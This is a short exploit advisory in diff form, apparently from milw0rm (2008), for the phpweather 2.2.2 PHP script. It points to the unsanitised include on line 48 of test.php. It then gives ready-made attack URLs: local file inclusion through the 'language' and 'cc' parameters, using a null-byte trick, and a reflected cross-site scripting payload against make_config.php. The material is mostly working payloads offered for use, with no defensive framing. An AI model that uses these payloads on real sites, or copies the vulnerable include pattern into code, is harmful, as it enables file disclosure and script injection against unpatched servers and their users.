@@ -1,0 +1,29 @@
+****(Lfi/xss)****
+
+script: phpweather-2.2.2
+
+***************************************************************************
+download from:http://downloads.sourceforge.net/phpweather/phpweather-2.2.2.zip?modtime=1087430400&big_mirror=0
+   
+***************************************************************************
+vul:
+/test.php
+
+line 48:
+ require(PHPWEATHER_BASE_DIR . "/output/pw_text_$language.php");
+   
+***************************************************
+xpl:
+www.site.com/path/test.php?metar=()&language=[Lfi]%00
+.....................................................
+www.site.com/path/index.php?cc=[Lfi]
+....................................................
+xss:
+www.site.com/path/config/make_config.php/>"><ScRiPt>alert(0)</ScRiPt>
+..................................................
+
+Author: ahmadbady from:iran
+
+***************************************************
+
+# milw0rm.com [2008-12-14]
